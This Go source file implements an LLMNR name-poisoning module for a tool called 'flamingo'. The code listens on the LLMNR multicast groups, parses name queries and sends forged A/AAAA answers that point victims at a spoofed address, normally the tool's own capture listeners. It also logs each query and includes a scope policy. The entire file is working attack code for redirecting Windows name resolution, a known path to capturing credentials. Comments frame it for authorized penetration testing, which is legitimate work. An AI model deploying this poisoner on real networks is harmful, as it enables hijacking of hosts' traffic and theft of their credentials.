package flamingo

import (
	"fmt"
	"net"
	"sync"

	log "github.com/sirupsen/logrus"
	"golang.org/x/net/ipv4"
	"golang.org/x/net/ipv6"
)

// LLMNR multicast groups (RFC 4795).
var (
	llmnrGroupV4 = net.IPv4(224, 0, 0, 252)
	llmnrGroupV6 = net.ParseIP("ff02::1:3")
)

// ConfLLMNR describes the options for the LLMNR poisoner.
type ConfLLMNR struct {
	BindPort     uint16
	BindHost     string
	RecordWriter *RecordWriter

	// Policy scopes which queries are answered. A nil policy answers all.
	Policy *ScopePolicy
	// SpoofIPv4/SpoofIPv6 override the advertised address. When empty, the
	// address of the interface the query arrived on is used.
	SpoofIPv4 string
	SpoofIPv6 string
	// AnswerName optionally replaces the name carried in the answer record
	// while the question name is echoed as asked.
	AnswerName string
	// TTL is the answer TTL in seconds.
	TTL uint32

	shutdown bool
	v4       *ipv4.PacketConn
	v6       *ipv6.PacketConn
	m        sync.Mutex
}

// NewConfLLMNR creates a default configuration for the LLMNR poisoner.
func NewConfLLMNR() *ConfLLMNR {
	return &ConfLLMNR{
		BindPort: 5355,
		BindHost: "[::]",
		TTL:      defaultLLMNRTTL,
		Policy:   DefaultScopePolicy(),
	}
}

// IsShutdown checks to see if the service is shutting down.
func (c *ConfLLMNR) IsShutdown() bool {
	c.m.Lock()
	defer c.m.Unlock()
	return c.shutdown
}

// Shutdown flags the service to shut down.
func (c *ConfLLMNR) Shutdown() {
	c.m.Lock()
	defer c.m.Unlock()
	if c.shutdown {
		return
	}
	c.shutdown = true
	if c.v4 != nil {
		c.v4.Close()
	}
	if c.v6 != nil {
		c.v6.Close()
	}
}

// SpawnLLMNR starts an LLMNR poisoner listening on the configured port.
//
// Name poisoning is active, not passive: unlike the capture listeners it makes
// hosts connect to flamingo. It is therefore opt-in and OFF by default; an
// operator must explicitly enable it (e.g. --protocols llmnr,nbtns,smb) and
// should only do so inside an authorized engagement scope. The ScopePolicy and
// analyze mode exist to keep answers inside that scope.
func SpawnLLMNR(c *ConfLLMNR) error {
	v4host, v6host := poisonBindHosts(c.BindHost)

	var started bool
	if v4host != "" {
		v4, err := openPoisonV4(v4host, c.BindPort, llmnrGroupV4, "llmnr")
		if err != nil {
			log.Debugf("llmnr: failed to open IPv4 socket on %s:%d: %s", v4host, c.BindPort, err)
		} else {
			c.v4 = v4
			started = true
			go poisonServeV4(v4, "llmnr", c.IsShutdown, c.handle)
		}
	}

	if v6host != "" {
		v6, err := openPoisonV6(v6host, c.BindPort, llmnrGroupV6, "llmnr")
		if err != nil {
			log.Debugf("llmnr: failed to open IPv6 socket on %s:%d: %s", v6host, c.BindPort, err)
		} else {
			c.v6 = v6
			started = true
			go poisonServeV6(v6, "llmnr", c.IsShutdown, c.handle)
		}
	}

	if !started {
		return fmt.Errorf("failed to listen on %s:%d for llmnr", c.BindHost, c.BindPort)
	}

	log.Debugf("llmnr is listening on %s:%d", c.BindHost, c.BindPort)
	return nil
}

// parseLLMNRQuery parses a single-label LLMNR query. It returns the TID, the raw
// queried name bytes, the query type, whether an AAAA answer is wanted, and
// whether the datagram is a query we answer.
func parseLLMNRQuery(data []byte) (tid, name []byte, qtype string, wantV6, ok bool) {
	// Header (12) + name length byte (1).
	if len(data) < 13 {
		return nil, nil, "", false, false
	}
	// Flags must be all-zero (standard query, opcode 0, no flags set).
	if data[2] != 0x00 || data[3] != 0x00 {
		return nil, nil, "", false, false
	}
	nameLen := int(data[12])
	if nameLen == 0 || 13+nameLen > len(data) {
		return nil, nil, "", false, false
	}
	name = data[13 : 13+nameLen]
	qtype, wantV6, ok = classifyDNSQuery(data)
	if !ok {
		return nil, nil, "", false, false
	}
	return data[0:2], name, qtype, wantV6, true
}

// buildLLMNRAnswer builds a byte-exact LLMNR response for the given question.
func buildLLMNRAnswer(tid, qname, aname []byte, wantV6 bool, ip net.IP, ttl uint32) []byte {
	rtype := []byte{0x00, 0x01} // A
	if wantV6 {
		rtype = []byte{0x00, 0x1c} // AAAA
	}

	out := make([]byte, 0, 64)
	out = append(out, tid...)     // transaction id
	out = append(out, 0x80, 0x00) // flags: QR=1
	out = append(out, 0x00, 0x01) // questions
	out = append(out, 0x00, 0x01) // answer RRs
	out = append(out, 0x00, 0x00) // authority RRs
	out = append(out, 0x00, 0x00) // additional RRs

	// Question (echoed).
	out = append(out, byte(len(qname)))
	out = append(out, qname...)
	out = append(out, 0x00)
	out = append(out, rtype...)
	out = append(out, 0x00, 0x01) // class IN

	// Answer.
	out = append(out, byte(len(aname)))
	out = append(out, aname...)
	out = append(out, 0x00)
	out = append(out, rtype...)
	out = append(out, 0x00, 0x01) // class IN
	out = be32(out, ttl)

	if wantV6 {
		out = append(out, 0x00, 0x10)
		out = append(out, ip.To16()...)
	} else {
		out = append(out, 0x00, 0x04)
		out = append(out, ip.To4()...)
	}
	return out
}

// handle processes one LLMNR datagram, records it, and returns any reply bytes.
func (c *ConfLLMNR) handle(data []byte, src net.Addr, ifIndex int) []byte {
	tid, name, qtype, wantV6, ok := parseLLMNRQuery(data)
	if !ok {
		return nil
	}
	qname := string(name)

	respond, reason := c.Policy.ShouldRespond(srcIP(src), qname)

	var spoof net.IP
	if respond {
		spoof = c.chooseSpoof(wantV6, ifIndex)
		if spoof == nil {
			respond = false
			reason = "no spoof address available"
		}
	}

	c.record(src, qname, qtype, respond, spoof, reason)
	if !respond {
		return nil
	}

	aname := name
	if c.AnswerName != "" {
		aname = []byte(c.AnswerName)
	}
	return buildLLMNRAnswer(tid, name, aname, wantV6, spoof, c.TTL)
}

// chooseSpoof returns the address to answer with: the explicit override when
// set, otherwise the address of the interface the query arrived on. When neither
// is available it returns nil and the caller answers nothing.
func (c *ConfLLMNR) chooseSpoof(wantV6 bool, ifIndex int) net.IP {
	if wantV6 {
		if c.SpoofIPv6 != "" {
			return net.ParseIP(c.SpoofIPv6)
		}
		return ifaceIPv6(ifIndex)
	}
	if c.SpoofIPv4 != "" {
		return net.ParseIP(c.SpoofIPv4).To4()
	}
	return ifaceIPv4(ifIndex)
}

func (c *ConfLLMNR) record(src net.Addr, name, qtype string, answered bool, spoof net.IP, reason string) {
	fields := map[string]string{
		"_server":  fmt.Sprintf("%s:%d", c.BindHost, c.BindPort),
		"name":     name,
		"qtype":    qtype,
		"answered": fmt.Sprintf("%t", answered),
	}
	if answered && spoof != nil {
		fields["spoofed"] = spoof.String()
	}
	if !answered && reason != "" {
		fields["reason"] = reason
	}
	c.RecordWriter.Record("query", "llmnr", src.String(), fields)
}
